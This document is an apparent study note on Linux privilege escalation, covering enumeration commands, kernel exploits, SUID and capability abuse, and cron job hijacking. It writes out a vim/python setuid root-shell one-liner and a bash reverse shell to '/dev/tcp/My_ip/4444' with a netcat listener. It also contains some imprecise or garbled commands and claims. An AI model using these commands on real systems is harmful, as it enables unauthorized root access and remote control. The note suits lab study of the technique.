# What is Linux Privilege Escalation?
- It is using the vulnerability on the host system to get access to the root user/shell.


### IMP commands for enumeration:
- `hostname` lists name of the host
- `uname -a` gives details of system and kernel
- `ps` shows process running in the system
- `env` to see the enviroment variables
- `sudo -l` to see what commands user can run using sudo
- `id` to see what privilege current user has
- `ifconfig` to see network details
- `netstat` what network processes are happening
- `find` to serach for files

### 1. Using CVE files to exploit the vulnerability:
- The linux systems have their vulernability listed in the cve site according to their kernel.
- We can use Exploits-DB to download the exploits file and use wget to upload it inside the target pc to escalate our privileges.

### 2. Using SUID as a leverage:
- Using `find / -type f -perm -04000 -ls 2>/dev/null` we can find the files which have SUID(set user id) or SGID on them.
- SUID files are those files which have been given privileges by the root user to act as root.
- Using these SUID files we can basically access root level privileges.
- We can use tools like nano(which might have these SUID privileges) or base64 crypto's through which we can access files like shaddow to get admin's password.

### Using Capabilites:
- Capabilities are very similar to SUID's excpet that they are given the power of root privileges for only the part of the work that they do.
- First we use `getcap -r / 2>/dev/null` which will search for all files which have the capabilites.
- Now, if we find a file which we can use to open other files like vim we access the root privileges.
- By typing this command we can access the older version of bash(i.e. sh) to get the root shell `./vim -c py3 import.os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`. Thi command uses vim to run python program where we use the os tool and set our uid to root/0 and use another tool inside os os.execl to send the path of the progra we want to run to linux system saying I want to run this- sh -and we type it again inside " to tell the it to name the service sh and -c is basically to tell it to run it in command mode. ther reset tells the system to clean the terminal before running the sh(old bash as admin).

### Using Cron Jobs:
- Cron jobs are files that run root privileges by default.
- They run within time intervels like 1hr 1 day 1 month etc.
- we use `less etc/crontab` or cat instead of less to see the files that are cron jobs.
- The system might give antivirus every minute and like this there might be other files which we can use.
- When we find the file which can be manupilated we remove everything from it and replace it with 
`#!/bin/bash
bash -i >& /dev/tcp/My_ip/4444 0>&1` Using this 4444 port ensures that we dont get inturupted by random errors. This script acts like a messege sender andwe will act as a reciever.
- To turn on our reciever we use netcat `nc -lvnp 4444`(We run this inside our machine not the ssh).


